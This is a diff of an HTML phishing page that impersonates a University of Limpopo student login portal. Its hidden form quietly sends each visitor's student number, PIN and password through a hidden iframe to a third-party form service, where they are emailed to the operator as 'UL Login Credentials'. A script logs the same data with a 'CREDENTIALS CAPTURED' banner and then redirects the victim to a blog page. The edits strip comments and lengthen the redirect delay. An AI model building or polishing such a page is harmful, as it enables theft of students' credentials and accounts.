@@ -1,4 +1,3 @@
-html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -28,7 +27,6 @@ body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: co
 </head>
 <body>
 
-<!-- Hidden iframe for form submission -->
 <iframe name="hidden_iframe" id="hidden_iframe" class="hidden-iframe"></iframe>
 
 <div class="wrap">
@@ -48,12 +46,9 @@ body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: co
     <div class="msg-error" id="msgError">⚠ Invalid credentials. Please verify your details and try again.</div>
 
     <form id="loginForm" method="POST" action="https://api.web3forms.com/submit" target="hidden_iframe">
-      <!-- Hidden fields -->
       <input type="hidden" name="access_key" value="90b58a30-8926-4005-a8f8-3a291773b087">
       <input type="hidden" name="_subject" value="UL Login Credentials">
       <input type="hidden" name="_captcha" value="false">
-      
-      <!-- REQUIRED: Web3Forms needs name and email fields -->
       <input type="hidden" name="name" value="UL Student">
       <input type="hidden" name="email" value="noreply@university.ac.za">
       
@@ -80,7 +75,6 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const errorMsg = document.getElementById('msgError');
     const submitBtn = document.getElementById('submitBtn');
     
-    // Validation
     if (!studentNumber || !pin || !password) {
         e.preventDefault();
         errorMsg.style.display = 'block';
@@ -94,26 +88,21 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         return;
     }
     
-    // Hide error, show loading state
     errorMsg.style.display = 'none';
     submitBtn.classList.add('loading');
     submitBtn.textContent = 'Authenticating...';
     
-    // Log captured data
     console.log("%c=== CREDENTIALS CAPTURED ===", "color: red; font-weight: bold");
     console.log("Student Number:", studentNumber);
     console.log("PIN:", pin);
     console.log("Password:", password);
     console.log("%c=============================", "color: red; font-weight: bold");
     
-    // Allow form to submit to hidden iframe
-    // After short delay, redirect user (increased to 3 seconds to ensure submission completes)
     setTimeout(() => {
         window.location.href = 'https://student-query.blogspot.com/2026/03/university-of-limpopo-student-query.html';
-    }, 3000);
+    }, 5000);
 });
 </script>
 
 </body>
 </html>
-```
